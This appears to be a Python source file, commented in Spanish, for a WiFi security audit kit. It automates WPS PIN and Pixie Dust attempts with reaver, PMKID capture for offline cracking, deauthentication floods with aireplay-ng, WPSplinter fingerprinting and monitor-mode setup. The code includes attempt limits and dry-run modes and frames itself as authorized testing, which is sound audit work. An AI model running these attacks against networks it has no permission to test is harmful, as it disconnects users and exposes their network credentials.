#!/usr/bin/env python3
"""Pruebas WiFi acotadas: bloqueo WPS PIN y adquisición PMKID autorizada."""

import argparse
import os
from pathlib import Path
import pwd
import re
import resource
import shutil
import sys
import subprocess
import tempfile

from oui_lookup import posible_wpsplinter, vendor_de_mac
from wps_capture_utils import estado_wps, etiqueta_modelo, lista_wps, parse_wash_json


MAC = re.compile(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}\Z")
IFACE = re.compile(r"[A-Za-z0-9_.-]+\Z")


def limitar_log():
    resource.setrlimit(resource.RLIMIT_FSIZE, (1024 * 1024, 1024 * 1024))


def limitar_captura():
    recurso = 32 * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_FSIZE, (recurso, recurso))


def validar_objetivo(interfaz, bssid, canal):
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    bssid = bssid.upper()
    if not MAC.fullmatch(bssid):
        raise ValueError("BSSID inválido")
    if not 1 <= canal <= 233:
        raise ValueError("canal fuera de 1..233")
    return bssid


def binario(nombre):
    encontrado = shutil.which(nombre)
    if encontrado:
        return encontrado
    sudo = os.environ.get("SUDO_USER")
    if sudo:
        try:
            ruta = Path(pwd.getpwnam(sudo).pw_dir) / ".local/bin" / nombre
        except KeyError:
            ruta = Path("/ruta/inexistente")
        if ruta.is_file() and os.access(ruta, os.X_OK):
            return str(ruta)
    raise ValueError(f"falta {nombre}")


def wps_pin(interfaz, bssid, canal, intentos=3, seco=False, pixie=False):
    bssid = validar_objetivo(interfaz, bssid, canal)
    if not 1 <= intentos <= 50:
        raise ValueError("--limite-intentos debe estar entre 1 y 50")
    if pixie:
        intentos = 1  # Pixie Dust no fuerza el PIN: captura nonces y los crackea offline
    if seco:
        modo = "Pixie Dust (captura de nonces y crack offline)" if pixie \
            else f"hasta {intentos} pruebas WPS PIN"
        print(f"Plan: wash pasivo y {modo} en {bssid}, canal {canal}")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    wash, reaver = binario("wash"), binario("reaver")
    os.umask(0o077)
    with tempfile.TemporaryDirectory(prefix="wps_pin_") as temporal:
        # Como en wifi-wps-scan: con airodump se captura y wash analiza el pcap
        # offline. En chips como el MT7925 el wash en vivo puede no ver un AP
        # que la captura offline sí detecta (ver README).
        texto = ""
        airodump = shutil.which("airodump-ng")
        if airodump:
            base = Path(temporal) / "wps_pin_probe"
            subprocess.run(["timeout", "--signal=INT", "--kill-after=3s", "10",
                            airodump, "-w", str(base), "--output-format", "pcap",
                            "-c", str(canal), interfaz],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           check=False)
            cap = Path(str(base) + "-01.cap")
            if cap.is_file() and cap.stat().st_size > 24:
                offline = subprocess.run([wash, "-f", str(cap), "-a"],
                                         capture_output=True, timeout=120,
                                         check=False, cwd=temporal)
                texto = offline.stdout.decode(errors="replace")
        if not texto.strip():
            try:
                exploracion = subprocess.run([wash, "-u", "-i", interfaz, "-c", str(canal)],
                                             capture_output=True, timeout=10, check=False,
                                             cwd=temporal)
                texto = exploracion.stdout.decode(errors="replace")
            except subprocess.TimeoutExpired as exc:
                texto = (exc.stdout or b"").decode(errors="replace")
        estado = estado_wps(texto.splitlines(), bssid, canal)
        if estado is None:
            print("WPS no observado; no se enviaron intentos PIN")
            return 3
        if estado[1].lower() in {"yes", "si", "sí", "1"}:
            print("WPS anuncia bloqueo; no se enviaron intentos PIN")
            return 0
        with tempfile.TemporaryFile() as registro:
            orden = [reaver, "-i", interfaz, "-b", bssid, "-c", str(canal)]
            if pixie:
                orden += ["--pixie-dust", "-vv", "-L", "-d", "5"]
            else:
                orden += ["-g", str(intentos), "-d", "5", "-l", "120"]
            if canal > 14:
                orden.append("-5")
            try:
                subprocess.run(orden, stdout=registro, stderr=subprocess.STDOUT,
                               timeout=240 if pixie else 24 * intentos + 60,
                               check=False, cwd=temporal,
                               preexec_fn=limitar_log)
            except subprocess.TimeoutExpired:
                print("Límite temporal alcanzado; prueba WPS inconcluyente")
                return 3
            registro.seek(0)
            resumen = registro.read(65536).decode(errors="replace").lower()
    if "wps pin:" in resumen or "wpa psk:" in resumen:
        print("Registro WPS logrado; PIN y contraseña ocultos")
        return 0
    if "rate limiting" in resumen or "locked" in resumen:
        print("Bloqueo o limitación de WPS detectado")
        return 0
    print(f"Hasta {intentos} intentos enviados; resultado inconcluyente, sin clave recuperada")
    return 1


def pmkid(interfaz, bssid, canal, banda=None, segundos=30, salida=None, seco=False):
    bssid = validar_objetivo(interfaz, bssid, canal)
    banda = banda or ("2g" if canal <= 14 else "5g")
    if banda not in {"2g", "5g"}:
        raise ValueError("--banda debe ser 2g o 5g")
    if not 5 <= segundos <= 600:
        raise ValueError("--segundos debe estar entre 5 y 600")
    canal_hcx = f"{canal}{'a' if banda == '2g' else 'b'}"
    if seco:
        print(f"Plan: PMKID de {bssid} en {interfaz}, canal {canal_hcx}, {segundos}s")
        print("hcxdumptool cambiará modo, MAC y canal de esta interfaz durante la captura")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz WiFi dedicada")
    hcx, conversion = binario("hcxdumptool"), binario("hcxpcapngtool")
    os.umask(0o077)
    if salida or os.environ.get("AUDITOR_CAPTURAS_DIR"):
        base = Path(salida or os.environ["AUDITOR_CAPTURAS_DIR"])
    elif os.environ.get("SUDO_USER"):
        base = Path(pwd.getpwnam(os.environ["SUDO_USER"]).pw_dir) / "capturas_wifi"
    else:
        base = Path.home() / "capturas_wifi"
    if base.is_symlink():
        raise ValueError("la salida no puede ser un enlace simbólico")
    base.mkdir(parents=True, exist_ok=True)
    carpeta = Path(tempfile.mkdtemp(prefix="pmkid_", dir=base))

    def ceder_salida():
        if os.environ.get("SUDO_UID") and os.environ.get("SUDO_GID"):
            uid, gid = int(os.environ["SUDO_UID"]), int(os.environ["SUDO_GID"])
            for ruta in carpeta.rglob("*"):
                os.chown(ruta, uid, gid)
            os.chown(carpeta, uid, gid)
    filtro = carpeta / "objetivo.bpf"
    expresion = f"wlan addr3 {bssid.replace(':', '')}"
    compilacion = subprocess.run([hcx, f"--bpfc={expresion}"], capture_output=True,
                                 timeout=10, check=False)
    if compilacion.returncode != 0 or not compilacion.stdout:
        ceder_salida()
        raise ValueError("hcxdumptool no pudo compilar el filtro del BSSID")
    filtro.write_bytes(compilacion.stdout)
    cap = carpeta / "captura.pcapng"
    orden = ["timeout", "--signal=INT", "--kill-after=3s", str(segundos), hcx,
             "-i", interfaz, "-c", canal_hcx, "-w", str(cap), f"--bpf={filtro}",
             "--disable_deauthentication", "--disable_proberequest",
             "--disable_reassociation", "--disable_beacon", "--attemptclientmax=0"]
    with open(os.devnull, "wb") as nada:
        proceso = subprocess.run(orden, stdout=nada, stderr=nada, check=False,
                                 preexec_fn=limitar_captura)
    filtro.unlink(missing_ok=True)
    if proceso.returncode not in {0, 124} or not cap.is_file():
        print("Captura PMKID fallida o vacía")
        ceder_salida()
        return 3
    todos = carpeta / "todos.22000"
    with open(os.devnull, "wb") as nada:
        subprocess.run([conversion, "-o", str(todos), str(cap)], stdout=nada,
                       stderr=nada, timeout=30, check=False)
    objetivo = carpeta / "pmkid_objetivo.22000"
    cantidad = 0
    if todos.is_file():
        with todos.open(encoding="ascii", errors="replace") as entrada, objetivo.open("w") as dest:
            for linea in entrada:
                campos = linea.strip().split("*")
                if len(campos) > 3 and campos[:2] == ["WPA", "01"] and campos[3].lower() == bssid.replace(":", "").lower():
                    dest.write(linea)
                    cantidad += 1
        todos.unlink(missing_ok=True)
    if not cantidad:
        objetivo.unlink(missing_ok=True)
    print(f"PMKID del objetivo: {cantidad}; captura privada: {cap}")
    if cantidad:
        print(f"Analiza por separado: auditor_generico.sh --tipo wifi {objetivo}")
    ceder_salida()
    return 0 if cantidad else 1


def _filas_enriquecidas(texto):
    """Filas normalizadas de una salida de wash, con fabricante/modelo.

    Usa primero el volcado -j (manufacturer/model_name/model_number del
    elemento WPS, si el AP los anunció); si no hay nada ahí, cae al formato
    de tabla de -a (sólo versión/bloqueo) y añade el fabricante por OUI de
    la MAC como estimación aparte.
    """
    filas = parse_wash_json(texto)
    if filas:
        return filas
    return [
        {"bssid": bssid, "canal": canal_ap, "essid": essid, "version": version,
         "locked": lock, "manufacturer": "", "model_name": "", "model_number": "",
         "device_name": ""}
        for bssid, canal_ap, version, lock, essid in lista_wps(texto.splitlines())
    ]


def wps_scan(interfaz, canal=None, segundos=20, seco=False):
    """Escaneo pasivo de objetivos WPS: lista APs con WPS, si anuncian
    bloqueo, y el fabricante/modelo que el propio router difunde en el
    elemento de información WPS (o, en su defecto, el fabricante del chip
    de red estimado por el OUI de la MAC).

    Método principal: captura con airodump-ng y analiza el pcap con wash -f.
    En chips como el mt7925, wash en vivo no ve los beacons; el análisis
    offline funciona de forma fiable. Sin airodump-ng se usa wash en vivo.
    """
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    if canal is not None and not 1 <= canal <= 233:
        raise ValueError("canal fuera de 1..233")
    if not 10 <= segundos <= 1200:
        raise ValueError("--segundos debe estar entre 10 y 1200")
    if seco:
        objetivo = f"canal {canal}" if canal else "barrido de canales"
        print(f"Plan: wash pasivo {segundos}s en {interfaz} ({objetivo}); sin enviar paquetes")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    wash = binario("wash")
    os.umask(0o077)
    filas = []
    with tempfile.TemporaryDirectory(prefix="wps_scan_") as temporal:
        airodump = shutil.which("airodump-ng")
        if airodump:
            base = Path(temporal) / "wps_scan"
            orden_cap = [airodump, "-w", str(base), "--output-format", "pcap"]
            orden_cap += (["-c", str(canal)] if canal else ["--band", "bg"])
            orden_cap.append(interfaz)
            subprocess.run(["timeout", "--signal=INT", "--kill-after=3s",
                            str(segundos), *orden_cap],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           check=False)
            cap = Path(str(base) + "-01.cap")
            if cap.is_file() and cap.stat().st_size > 24:
                offline = subprocess.run([wash, "-f", str(cap), "-a", "-j"],
                                         capture_output=True, timeout=120,
                                         check=False, cwd=temporal)
                filas = _filas_enriquecidas(offline.stdout.decode(errors="replace"))
        else:
            orden = [wash, "-u", "-a", "-j", "-i", interfaz]
            if canal:
                orden += ["-c", str(canal)]
            try:
                exploracion = subprocess.run(orden, capture_output=True,
                                             timeout=segundos, check=False,
                                             cwd=temporal)
                texto = exploracion.stdout.decode(errors="replace")
            except subprocess.TimeoutExpired as exc:
                texto = (exc.stdout or b"").decode(errors="replace")
            filas = _filas_enriquecidas(texto)
    if not filas:
        print("Sin APs con WPS observados; el escaneo no demuestra ausencia de WPS")
        return 1
    candidatos = 0
    avisos_wpsplinter = []
    for fila in filas:
        bssid, canal_ap = fila["bssid"], fila["canal"]
        bloqueado = fila["locked"].lower() in {"yes", "si", "sí", "1"}
        # «sin bloqueo anunciado» no demuestra vulnerabilidad: sólo indica que
        # el beacon no reporta lock; puede no admitir PIN o tener protección real.
        marca = "sin bloqueo anunciado" if not bloqueado else "bloqueado"
        if not bloqueado:
            candidatos += 1
        vendor_oui = vendor_de_mac(bssid)
        modelo = etiqueta_modelo(fila, vendor_oui)
        extra = f" · {modelo}" if modelo else ""
        print(f"{bssid} canal {canal_ap} WPS {fila['version']} {marca} "
              f"{fila['essid']}{extra}".rstrip())
        vendor_anunciado = fila.get("manufacturer") or vendor_oui or ""
        if posible_wpsplinter(vendor_anunciado):
            avisos_wpsplinter.append(bssid)
    if candidatos:
        print(f"{candidatos} objetivo(s) WPS sin bloqueo anunciado; prueba acotada: "
              f"auditor_generico.sh --tipo wifi-wps-pin --interfaz {interfaz} "
              f"--bssid <BSSID> --canal <canal>")
    if avisos_wpsplinter:
        print(f"\nAviso informativo: {len(avisos_wpsplinter)} AP(s) con fabricante que "
              "figura en el listado público de WPSplinter (desbordamiento en el "
              "reensamblado EAP de WPS del stack Broadcom; sin CVE, sin PoC público, "
              "sin confirmar si este equipo en concreto está afectado): "
              + ", ".join(avisos_wpsplinter))
        print("Esta herramienta no comprueba ni explota ese fallo: desactiva WPS si no lo "
              "usas y consulta a tu operadora si hay firmware que lo corrija.")
    return 0


def deauth(interfaz, bssid, cliente=None, golpes=10, seco=False):
    """Inyección de desautenticación con aireplay-ng para forzar el 4-way handshake."""
    bssid = validar_objetivo(interfaz, bssid, 1)
    if cliente is not None:
        cliente = cliente.upper()
        if not MAC.fullmatch(cliente):
            raise ValueError("MAC de cliente inválida")
    if not 1 <= golpes <= 200:
        raise ValueError("--golpes debe estar entre 1 y 200")
    destino = f"al cliente {cliente}" if cliente else "a todos los clientes"
    if seco:
        print(f"Plan: aireplay-ng --deauth {golpes} -a {bssid}"
              f"{f' -c {cliente}' if cliente else ''} en {interfaz}; "
              f"desconecta temporalmente {destino} para forzar el 4-way handshake")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo e interfaz ya en modo monitor")
    aireplay = binario("aireplay-ng")
    orden = [aireplay, "--ignore-negative-one", "-0", str(golpes), "-a", bssid]
    if cliente:
        orden += ["-c", cliente]
    orden.append(interfaz)
    os.umask(0o077)
    with tempfile.TemporaryDirectory(prefix="deauth_") as temporal:
        try:
            proceso = subprocess.run(orden, capture_output=True,
                                     timeout=6 * golpes + 60, check=False, cwd=temporal)
        except subprocess.TimeoutExpired:
            print("aireplay-ng superó su límite temporal; inyección inconcluyente")
            return 3
    resumen = proceso.stdout.decode(errors="replace") + proceso.stderr.decode(errors="replace")
    if "send failed" in resumen.lower():
        print("Inyección fallida: el kernel rechazó los paquetes. "
              "Comprueba que la interfaz está en modo monitor real")
        return 3
    if proceso.returncode != 0:
        print(f"aireplay-ng terminó con código {proceso.returncode}; inyección inconcluyente")
        return 3
    print(f"{golpes} desautenticaciones enviadas a {bssid} ({destino}); "
          "captura el handshake con hcxdumptool/airodump-ng mientras se reconectan")
    return 0


def _interfaces_wifi():
    """Nombres de las interfaces WiFi presentes (tengan o no driver cargado)."""
    base = Path("/sys/class/net")
    if not base.is_dir():
        return []
    return sorted(p.parent.name for p in base.glob("*/wireless"))


def _interfaz_predeterminada():
    """Interfaz de la ruta por defecto (probable conexión a internet), o None."""
    ip = shutil.which("ip")
    if not ip:
        return None
    try:
        salida = subprocess.run([ip, "-o", "route", "show", "default"],
                                capture_output=True, text=True, timeout=5,
                                check=False).stdout
    except (OSError, subprocess.TimeoutExpired):
        return None
    m = re.search(r"\bdev\s+(\S+)", salida)
    return m.group(1) if m else None


def _modo_interfaz(interfaz):
    """'monitor'/'managed'/otro según iw, o None si no se puede saber."""
    iw = shutil.which("iw")
    if not iw:
        return None
    try:
        salida = subprocess.run([iw, "dev", interfaz, "info"], capture_output=True,
                                text=True, timeout=5, check=False).stdout
    except (OSError, subprocess.TimeoutExpired):
        return None
    m = re.search(r"\btype\s+(\S+)", salida)
    return m.group(1) if m else None


def listar_interfaces_wifi():
    """Imprime las interfaces WiFi detectadas, su modo actual y si son la
    interfaz con la ruta por defecto (la que probablemente te da internet:
    pasarla a modo monitor te desconecta)."""
    interfaces = _interfaces_wifi()
    if not interfaces:
        print("No se detectaron interfaces WiFi en /sys/class/net")
        return 1
    predeterminada = _interfaz_predeterminada()
    print(f"{'INTERFAZ':<16}{'MODO':<26}{'RUTA POR DEFECTO'}")
    for interfaz in interfaces:
        modo = _modo_interfaz(interfaz) or "desconocido (instala iw)"
        marca = "sí — ¡cuidado, es tu conexión!" if interfaz == predeterminada else "no"
        print(f"{interfaz:<16}{modo:<26}{marca}")
    return 0


def _interfaces_monitor():
    """Interfaces cuyo tipo declarado por iw es 'monitor'."""
    iw = shutil.which("iw")
    if not iw:
        return []
    try:
        salida = subprocess.run([iw, "dev"], capture_output=True, text=True,
                                timeout=5, check=False).stdout
    except (OSError, subprocess.TimeoutExpired):
        return []
    nombre = None
    monitores = []
    for linea in salida.splitlines():
        partes = linea.split()
        if len(partes) >= 2 and partes[0] == "Interface":
            nombre = partes[1]
        elif len(partes) >= 2 and partes[0] == "type" and partes[1] == "monitor" and nombre:
            monitores.append(nombre)
    return monitores


def activar_monitor(interfaz, forzar=False):
    """Pone la interfaz en modo monitor y DEVUELVE el nombre real a usar.

    Prefiere airmon-ng: en chips como el mt7925 (MediaTek) la interfaz
    creada con `iw dev X set type monitor` existe pero airodump-ng no
    consigue sintonizarla (ioctl SIOCSIWMODE: Operation not supported),
    mientras que la <iface>mon de airmon-ng sí funciona. airmon-ng hace
    además `check kill` (tumba NetworkManager), así que al desactivar hay
    que resucitarlo.
    """
    airmon = shutil.which("airmon-ng")
    if airmon:
        antes = set(_interfaces_monitor())
        subprocess.run([airmon, "check", "kill"], capture_output=True,
                       timeout=90, check=False)
        arranque = subprocess.run([airmon, "start", interfaz],
                                  capture_output=True, text=True, timeout=90,
                                  check=False)
        nuevos = [m for m in _interfaces_monitor() if m not in antes]
        if nuevos:
            return nuevos[0]
        # airmon-ng dice "already enabled": la monitor ya existía
        existentes = [m for m in _interfaces_monitor() if m.startswith(interfaz)]
        if existentes:
            return existentes[0]
        if _modo_interfaz(interfaz) == "monitor":
            return interfaz
        detalle = (arranque.stderr or arranque.stdout).strip().splitlines()
        raise ValueError("airmon-ng no creó una interfaz monitor"
                         + (f": {detalle[-1]}" if detalle else ""))
    ip = shutil.which("ip")
    iw = shutil.which("iw")
    if not ip or not iw:
        raise ValueError("faltan 'ip' y/o 'iw' (sudo apt-get install -y iw iproute2)")
    subprocess.run([ip, "link", "set", interfaz, "down"], check=False, timeout=10)
    cambio = subprocess.run([iw, "dev", interfaz, "set", "type", "monitor"],
                            capture_output=True, text=True, timeout=10, check=False)
    subprocess.run([ip, "link", "set", interfaz, "up"], check=False, timeout=10)
    if cambio.returncode != 0 or _modo_interfaz(interfaz) != "monitor":
        detalle = (cambio.stderr or cambio.stdout).strip()
        raise ValueError(f"no se pudo poner {interfaz} en modo monitor"
                         + (f": {detalle}" if detalle else ""))
    return interfaz


def desactivar_monitor(interfaz):
    """Saca la interfaz de modo monitor y devuelve la base gestionada."""
    airmon = shutil.which("airmon-ng")
    if airmon and _modo_interfaz(interfaz) == "monitor":
        subprocess.run([airmon, "stop", interfaz], capture_output=True,
                       timeout=90, check=False)
    if _modo_interfaz(interfaz) == "monitor":
        ip = shutil.which("ip")
        iw = shutil.which("iw")
        subprocess.run([ip, "link", "set", interfaz, "down"], check=False, timeout=10)
        subprocess.run([iw, "dev", interfaz, "set", "type", "managed"],
                       capture_output=True, timeout=10, check=False)
        subprocess.run([ip, "link", "set", interfaz, "up"], check=False, timeout=10)
    base = interfaz[:-3] if interfaz.endswith("mon") else interfaz
    nmcli = shutil.which("nmcli")
    if nmcli:
        # airmon-ng check kill se llevó NetworkManager por delante: si está
        # muerto, resucítalo antes de reconectar la interfaz base.
        nm = subprocess.run(["systemctl", "is-active", "NetworkManager"],
                            capture_output=True, text=True, timeout=10, check=False)
        if nm.stdout.strip() != "active":
            subprocess.run(["systemctl", "start", "NetworkManager"],
                           capture_output=True, timeout=30, check=False)
        subprocess.run([nmcli, "device", "connect", base], capture_output=True,
                       timeout=15, check=False)
    return base


def wifi_monitor(interfaz, accion, forzar=False, seco=False):
    """Activa o desactiva el modo monitor de una interfaz WiFi propia.

    No ataca nada: es el equivalente a `airmon-ng start/stop`, necesario
    antes de usar wifi-wps-scan, wifi-wps-pin, wifi-pmkid o wifi-deauth.
    Poner en modo monitor la interfaz que te da internet o SSH te
    desconecta; por eso se niega sobre la interfaz de la ruta por defecto
    salvo que confirmes con --forzar.
    """
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    if accion not in ("activar", "desactivar"):
        raise ValueError("--accion debe ser 'activar' o 'desactivar'")
    if interfaz not in _interfaces_wifi() and _modo_interfaz(interfaz) != "monitor":
        raise ValueError(f"'{interfaz}' no aparece como interfaz WiFi en /sys/class/net "
                          "(usa --listar para ver las disponibles)")
    predeterminada = _interfaz_predeterminada()
    riesgo = accion == "activar" and interfaz == predeterminada
    if riesgo and not forzar:
        raise ValueError(f"'{interfaz}' es la interfaz con la ruta por defecto (probablemente "
                          "tu conexión a internet o la que sostiene esta sesión). Activar modo "
                          "monitor la desconectará. Usa otra interfaz/adaptador, o repite con "
                          "--forzar si de verdad quieres desconectarla")
    if seco:
        aviso_riesgo = " (¡desconectará tu conexión actual!)" if riesgo else ""
        print(f"Plan: {accion} modo monitor en {interfaz}{aviso_riesgo}")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo")
    if accion == "activar":
        monitor = activar_monitor(interfaz, forzar)
        print(f"{monitor} en modo monitor. Úsala tal cual en wifi-escanear/"
              f"wifi-wps-scan/wifi-wps-pin/wifi-pmkid/wifi-deauth/wifi-wpsplinter; "
              f"cuando termines, desactívala con --tipo monitor --interfaz {monitor} "
              f"--accion desactivar")
        return 0
    base = desactivar_monitor(interfaz)
    print(f"Modo monitor desactivado. Si {base} no recupera red sola, reconéctate "
          "manualmente (nmcli/NetworkManager o tu gestor habitual)")
    return 0


def _ap_del_csv(csv_path):
    """APs del CSV de airodump: [(bssid, canal, essid, potencia)], sin duplicados."""
    from wifi_capture_utils import normalizar_mac
    vistos = {}
    with Path(csv_path).open(newline="", encoding="utf-8", errors="replace") as archivo:
        import csv as _csv
        for fila in _csv.reader(archivo):
            if not fila:
                continue
            primero = fila[0].strip()
            if primero == "Station MAC":
                break
            if primero == "BSSID" or len(fila) < 14:
                continue
            try:
                mac = normalizar_mac(primero)
                canal = int(fila[3].strip())
                potencia = int(fila[8].strip())
            except ValueError:
                continue
            if not 1 <= canal <= 233:
                continue
            nombre = fila[13].strip() or "(oculta)"
            if mac not in vistos or potencia > vistos[mac][3]:
                vistos[mac] = (mac, canal, nombre, potencia)
    return sorted(vistos.values(), key=lambda ap: -ap[3])


def wifi_escanear(interfaz, banda="abg", segundos=20, forzar=False, seco=False):
    """Escanea el entorno y lista objetivos numerados para elegir uno.

    Si la interfaz no está en modo monitor la activa (con --forzar si es la
    de tu ruta por defecto) y DEJA el modo monitor activo al terminar: sólo
    wifi-monitor --accion desactivar lo quita. Imprime una línea
    `MONITOR <interfaz>` y luego `AP <n> <BSSID> <canal> <potencia> <ESSID>`
    por cada red vista, en orden de señal.
    """
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    if not 5 <= segundos <= 1200:
        raise ValueError("segundos fuera de 5..1200")
    if banda not in ("bg", "a", "abg"):
        raise ValueError("banda debe ser bg, a o abg")
    if seco:
        print(f"Plan: escanear con {interfaz} (banda {banda}, {segundos}s); "
              "activar monitor si hace falta y dejarlo activo")
        return 0
    if _modo_interfaz(interfaz) == "monitor":
        monitor = interfaz
    else:
        if interfaz not in _interfaces_wifi():
            raise ValueError(f"'{interfaz}' no es una interfaz WiFi; usa --listar")
        monitor = activar_monitor(interfaz, forzar)
    airodump = shutil.which("airodump-ng")
    if not airodump:
        raise ValueError("falta airodump-ng (paquete aircrack-ng)")
    if os.geteuid() != 0:
        raise ValueError("requiere sudo")
    limitar_captura()
    with tempfile.TemporaryDirectory(prefix="kit-escaneo-") as tmp:
        proceso = subprocess.Popen(
            [airodump, "--band", banda, "--output-format", "csv",
             "--write-interval", "1", "-w", Path(tmp) / "scan", monitor],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            subprocess.run(["sleep", str(segundos)], check=False)
            proceso.terminate()
            proceso.wait(timeout=15)
        finally:
            if proceso.poll() is None:
                proceso.kill()
        csvs = sorted(Path(tmp).glob("scan-*.csv"))
        if not csvs:
            raise ValueError("el escaneo no creó CSV; comprueba la interfaz monitor")
        aps = _ap_del_csv(csvs[-1])
    print(f"MONITOR {monitor}")
    if not aps:
        print("No se vio ninguna red; prueba otra banda o más segundos")
        return 1
    for numero, (mac, canal, nombre, potencia) in enumerate(aps, 1):
        print(f"AP {numero} {mac} {canal} {potencia} {nombre}")
    return 0


def wifi_wpsplinter(interfaz, ssid, salida=None, seco=False):
    """Huella activa WPSplinter (desbordamiento WPS en monitor Broadcom).

    Lanza el fingerprinter de Quentin Kaiser (third_party/broadcom-wps, MIT)
    contra un SSID: envía EAP fragmentados y clasifica el reensamblador del
    AP como LIKELY_VULNERABLE / LIKELY_NOT_VULNERABLE / INCONCLUSIVE. No
    explota nada ni tumba el AP; es una prueba pasiva-activa acotada.
    Requiere root, la interfaz en modo monitor y la librería scapy.
    """
    if not IFACE.fullmatch(interfaz):
        raise ValueError("interfaz inválida")
    if not ssid or len(ssid.encode("utf-8")) > 32:
        raise ValueError("SSID de 1 a 32 bytes")
    script = Path(__file__).resolve().parent / "third_party" / "broadcom-wps" / "broadcom_fingerprint.py"
    if not script.is_file():
        raise ValueError(f"falta {script}")
    if seco:
        print(f"Plan: fingerprinter WPSplinter sobre '{ssid}' con {interfaz} "
              f"(requiere root, monitor y scapy)")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo")
    if _modo_interfaz(interfaz) != "monitor":
        raise ValueError(f"{interfaz} no está en modo monitor; usa wifi-monitor "
                         "--accion activar o la opción 'Escaneo de objetivos'")
    try:
        import scapy  # noqa: F401
    except ImportError:
        raise ValueError("falta la librería scapy (python3 -m pip install --user "
                         "--break-system-packages scapy)")
    if salida:
        destino = Path(salida).expanduser()
    else:
        inicio = Path.home()
        usuario = os.environ.get("SUDO_USER")
        if usuario and os.geteuid() == 0:
            try:
                inicio = Path(pwd.getpwnam(usuario).pw_dir)
            except KeyError:
                pass
        destino = inicio / "capturas_wifi" / "wpsplinter"
    destino.mkdir(parents=True, exist_ok=True, mode=0o700)
    print(f"Evidencias (pcap + JSON) en: {destino}")
    try:
        subprocess.run(["iw", "dev", interfaz, "info"], capture_output=True,
                       timeout=5, check=True)
    except (OSError, subprocess.TimeoutExpired, subprocess.CalledProcessError):
        pass
    rc = subprocess.run([sys.executable, str(script), "--interface", interfaz,
                         "--ssid", ssid], cwd=destino, check=False).returncode
    usuario = os.environ.get("SUDO_USER")
    if usuario and os.geteuid() == 0:
        subprocess.run(["chown", "-R", usuario, str(destino)], capture_output=True,
                       timeout=15, check=False)
    if rc == 0:
        print("Veredicto concluyente: revisa result.json y el informe anterior.")
    elif rc == 1:
        print("Veredicto INCONCLUSIVE: el AP no respondió de forma clara; "
              "prueba con más duración o comprueba que anuncia WPS.")
    else:
        print("El fingerprinter terminó con error (2): revisa SSID exacto e interfaz.")
    return rc


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="accion", required=True)
    for accion in ("wifi-wps-pin", "wifi-pmkid"):
        subparser = sub.add_parser(accion)
        subparser.add_argument("--interfaz", required=True)
        subparser.add_argument("--bssid", required=True)
        subparser.add_argument("--canal", type=int, required=True)
        subparser.add_argument("--dry-run", action="store_true")
        if accion == "wifi-wps-pin":
            subparser.add_argument("--limite-intentos", type=int, default=3)
            subparser.add_argument("--pixie", action="store_true",
                                   help="Pixie Dust: crack offline del PIN sin fuerza bruta")
        else:
            subparser.add_argument("--banda", choices=("2g", "5g"))
            subparser.add_argument("--segundos", type=int, default=30)
            subparser.add_argument("--salida")
    deauth_parser = sub.add_parser("wifi-deauth")
    deauth_parser.add_argument("--interfaz", required=True)
    deauth_parser.add_argument("--bssid", required=True)
    deauth_parser.add_argument("--cliente")
    deauth_parser.add_argument("--golpes", type=int, default=10)
    deauth_parser.add_argument("--dry-run", action="store_true")
    scan_parser = sub.add_parser("wifi-wps-scan")
    scan_parser.add_argument("--interfaz", required=True)
    scan_parser.add_argument("--canal", type=int)
    scan_parser.add_argument("--segundos", type=int, default=20)
    scan_parser.add_argument("--dry-run", action="store_true")
    escanear_parser = sub.add_parser("wifi-escanear")
    escanear_parser.add_argument("--interfaz", required=True)
    escanear_parser.add_argument("--banda", choices=("bg", "a", "abg"), default="abg")
    escanear_parser.add_argument("--segundos", type=int, default=20)
    escanear_parser.add_argument("--forzar", action="store_true")
    escanear_parser.add_argument("--dry-run", action="store_true")
    wpsplinter_parser = sub.add_parser("wifi-wpsplinter")
    wpsplinter_parser.add_argument("--interfaz", required=True)
    wpsplinter_parser.add_argument("--ssid", required=True)
    wpsplinter_parser.add_argument("--salida")
    wpsplinter_parser.add_argument("--dry-run", action="store_true")
    monitor_parser = sub.add_parser("wifi-monitor")
    monitor_parser.add_argument("--interfaz")
    monitor_parser.add_argument("--accion", dest="accion_monitor",
                                choices=("activar", "desactivar"))
    monitor_parser.add_argument("--listar", action="store_true")
    monitor_parser.add_argument("--forzar", action="store_true")
    monitor_parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    try:
        if args.accion == "wifi-wps-pin":
            return wps_pin(args.interfaz, args.bssid, args.canal,
                           args.limite_intentos, args.dry_run, args.pixie)
        if args.accion == "wifi-deauth":
            return deauth(args.interfaz, args.bssid, args.cliente,
                          args.golpes, args.dry_run)
        if args.accion == "wifi-wps-scan":
            return wps_scan(args.interfaz, args.canal, args.segundos, args.dry_run)
        if args.accion == "wifi-escanear":
            return wifi_escanear(args.interfaz, args.banda, args.segundos,
                                 args.forzar, args.dry_run)
        if args.accion == "wifi-wpsplinter":
            return wifi_wpsplinter(args.interfaz, args.ssid, args.salida, args.dry_run)
        if args.accion == "wifi-monitor":
            if args.listar:
                return listar_interfaces_wifi()
            if not args.interfaz or not args.accion_monitor:
                parser.error("wifi-monitor requiere --listar, o --interfaz y --accion")
            return wifi_monitor(args.interfaz, args.accion_monitor, args.forzar, args.dry_run)
        return pmkid(args.interfaz, args.bssid, args.canal, args.banda,
                     args.segundos, args.salida, args.dry_run)
    except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
